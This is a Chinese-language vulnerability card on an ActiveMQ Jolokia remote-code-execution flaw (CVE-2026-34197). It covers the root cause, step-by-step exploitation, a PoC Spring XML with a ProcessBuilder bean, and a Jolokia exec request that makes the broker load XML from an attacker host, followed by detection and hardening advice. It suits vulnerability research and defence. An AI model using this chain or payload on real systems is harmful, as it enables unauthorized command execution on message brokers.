---
id: web-java-component-activemq-jolokia-networkconnector-xbean-rce
title: ActiveMQ Jolokia 默认放行 Broker exec：addNetworkConnector 的 vm brokerConfig 加载远程 Spring XML RCE（CVE-2026-34197）
type: scenario
domain: web
path: web/java/component
technique: jolokia-mbean-networkconnector-vm-brokerconfig-xbean
aliases:
- CVE-2026-34197
- ActiveMQ Jolokia RCE
- ActiveMQ addNetworkConnector RCE
- brokerConfig xbean RCE
- vm transport brokerConfig
- Jolokia MBean exec
tags:
- java
- activemq
- jolokia
- jmx
- mbean
- xbean
- spring
- rce
- cve-2026-34197
cve:
- CVE-2026-34197
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Apache ActiveMQ Broker < 5.19.4; 6.0.0 - 6.2.3
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:06:59+08:00'
  notes: 已对照原文与 7 张图片核对：Jolokia 策略放行 org.apache.activemq:* 全部 operation；addNetworkConnector(static:(vm://rcebroker42?brokerConfig=xbean:...)) 返回 NC，start 后 broker 日志显示加载远程 evil.xml、evil-http 收到 GET，/tmp/PWNED_SUCCESS 出现。Jolokia 需凭据（复现为默认 admin:admin）与 Origin/Referer，卡内已注明。未在本机复现。
---

## 一句话结论

ActiveMQ Classic 的 Jolokia 访问策略默认对 `org.apache.activemq:*` 放开所有操作，持有 Web 控制台凭据（或默认口令）的攻击者可调用 `BrokerService.addNetworkConnector(String)`，用 `static:(vm://新broker?brokerConfig=xbean:http://attacker/evil.xml)` 让 broker 下载并解析远程 Spring XML；Spring 实例化 singleton bean 时调用 `ProcessBuilder.start()`，形成远程命令执行。

## 原理

- Jolokia 的 `jolokia-access.xml` 在 `<commands>` 中默认只允许 read/list/version/search，但随后 `<allow><mbean>org.apache.activemq:*</mbean><operation>*</operation></allow>` 覆盖了命令限制：只要请求的是 ActiveMQ MBean，`exec` 也被允许。
- `BrokerService.addNetworkConnector(String)` 把 attacker 提供的 discovery URI 包装成 `DiscoveryNetworkConnector`；`static:(...)` 由 `SimpleDiscoveryAgent` 直接返回冒号后的 URI。
- 启动 connector 时 `DiscoveryNetworkConnector.onServiceAdd()` 调用 `TransportFactory.connect(connectUri)`；`vm://` scheme 进入 `VMTransportFactory.doCompositeConnect()`。
- `VMTransportFactory` 从 URI 参数取出 `brokerConfig`，若目标 broker 名在 `BrokerRegistry` 中不存在且允许创建，则调用 `BrokerFactory.createBroker(brokerURI)`；`xbean:` scheme 路由到 `XBeanBrokerFactory`。
- `XBeanBrokerFactory.createBroker()` 去掉 scheme 得到 `http://attacker/evil.xml`，经 `Utils.resourceFromString()` 转成 `UrlResource`，再构造 `ResourceXmlApplicationContext`。该 context 在构造阶段实例化所有 singleton bean，`java.lang.ProcessBuilder` 配合 `init-method="start"` 即执行命令。
- 两个约束保证链稳定：XML 中必须有 `id="broker"` 的 `BrokerService` bean（否则 `context.getBean("broker")` 失败中断），且 `cmd` bean 必须放在 `broker` 前、broker 设 `persistent="false"`，避免 KahaDB 锁等待阻塞后续 bean 实例化。
- 这条链把“JMX 管理操作”变成“加载远程 Spring 配置”，最终 sink 是 Spring bean 实例化，不依赖反序列化 gadget。

## 触发条件

- ActiveMQ Broker 处于受影响版本（`<5.19.4` 或 `6.0.0–6.2.3`）。
- `/api/jolokia/` 可被攻击者访问（默认随 Web 控制台暴露），且攻击者持有可用凭据——原文复现使用 `admin:admin`，因此实际前提是默认口令或已知/弱口令；Jolokia 的 `<cors><strict-checking/></cors>` 要求请求带 `Origin`/`Referer`，直接 API 客户端可自行设置。
- Jolokia 访问策略未被收紧，`org.apache.activemq:*` 的 exec 仍被允许。
- Broker 进程能向外发起 HTTP 请求访问攻击者控制的 XML；攻击者可用浏览器不可达但 broker 可达的地址。
- 目标 broker 名未被占用（`vm://` 中使用的名字需不存在，否则不会创建新 broker、不加载 `brokerConfig`）。

## 利用步骤

1. 确认 `/api/jolokia/` 可访问并取得凭据；访问 `POST /api/jolokia` 的 `version` 或 `search` 验证。
2. 在攻击者服务器托管恶意 Spring XML，包含 `cmd` bean（ProcessBuilder + `init-method="start"`）和必需的 `broker` bean（`persistent="false"`），`cmd` 在前。
3. 调用 `BrokerService.addNetworkConnector(java.lang.String)`，参数为 `static:(vm://rcebroker42?brokerConfig=xbean:http://attacker:8000/evil.xml)`；返回 `"value":"NC"` 表示成功。
4. 通过 `search` 找到新建的 network connector MBean：`org.apache.activemq:brokerName=localhost,connector=networkConnectors,networkConnectorName=NC,type=Broker`。
5. 对其执行 `start`；connector 建立到 `vm://rcebroker42` 的连接，VMTransportFactory 创建新 broker 并加载远程 XML。
6. 验证命令执行：`/tmp/PWNED_SUCCESS` 出现；broker 日志显示 `Establishing network connection ... brokerConfig=xbean:http://...`，恶意 HTTP 日志显示 `GET /evil.xml`。
7. 若重复添加返回 500（NC 已注册），先调用 `removeNetworkConnector("NC")` 再添加。

## PoC

恶意 Spring XML：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <!-- cmd 必须在 broker 前，先触发命令 -->
    <bean id="cmd" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <value>touch</value>
                <value>/tmp/PWNED_SUCCESS</value>
            </list>
        </constructor-arg>
    </bean>
    <!-- broker 必须存在且非持久化，避免 KahaDB 锁阻塞 -->
    <bean id="broker" class="org.apache.activemq.xbean.XBeanBrokerService">
        <property name="brokerName" value="rcebroker42"/>
        <property name="persistent" value="false"/>
    </bean>
</beans>
```

Jolokia 调用：

```http
POST /api/jolokia HTTP/1.1
Host: 127.0.0.1:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: application/json
Origin: http://127.0.0.1:8161
Referer: http://127.0.0.1:8161/

{
  "type": "exec",
  "mbean": "org.apache.activemq:brokerName=localhost,type=Broker",
  "operation": "addNetworkConnector(java.lang.String)",
  "arguments": ["static:(vm://rcebroker42?brokerConfig=xbean:http://attacker:8000/evil.xml)"]
}
```

随后对 search 得到的 `networkConnectorName=NC` MBean 执行 `start` 即可触发。

## 变体与关联

- `BrokerService.addConnector(String)` 是同类暴露方法，若策略同样放行 exec，可尝试用带 `brokerConfig` 的 URI 走同一 VMTransportFactory 路径。
- `brokerConfig` 不限于 `http://`：`xbean:` 后接 `file:`、`classpath:` 等也会被 `Utils.resourceFromString` 处理；远程 HTTP 最通用。
- 除 `ProcessBuilder` 外，任何能在 Spring 实例化阶段执行副作用的 bean（如 `Runtime.exec` 的工厂、JNDI 查找）都可作为载荷。
- 与 [[web-java-component-jimureport-unauth-aviator-rce]] 等 Java 组件 RCE 的差异：本链不依赖表达式/反序列化，而是滥用管理面 MBean 操作 + 远程配置加载。
- 边界：Jolokia 需要凭据，默认口令场景下等价于未授权；若已修改强口令并限制来源，攻击面显著降低。

## 检测与防御

- 升级到受影响区间之外的版本（5.19.4+ / 6.2.4+），并核对官方安全公告。
- 收紧 Jolokia：只绑定 localhost/管理网段；从 `<commands>` 移除 `exec`（或至少移除 write/exec）；把 `<allow>` 中 `org.apache.activemq:*` 的 `<operation>*</operation>` 改为只读白名单；启用强认证并修改默认口令。
- 禁用或限制 `vm://` 的 `brokerConfig`：只允许加载本地受信路径，拒绝 `http(s)://` 等远程 XBean 配置；对 `addNetworkConnector`/`addConnector` 做管理面权限控制。
- 网络侧：限制 broker 出站 HTTP，禁止访问非业务必需地址；Web 控制台不对公网暴露。
- 检测：Jolokia 日志出现 `exec` + `addNetworkConnector`/`addConnector` + `brokerConfig=`；broker 日志出现 `Establishing network connection ... brokerConfig=xbean:http`；短时间内新建异常 broker 名或 NetworkConnector；出站请求 `/evil.xml` 等可疑静态文件；`/tmp` 等目录出现异常文件。
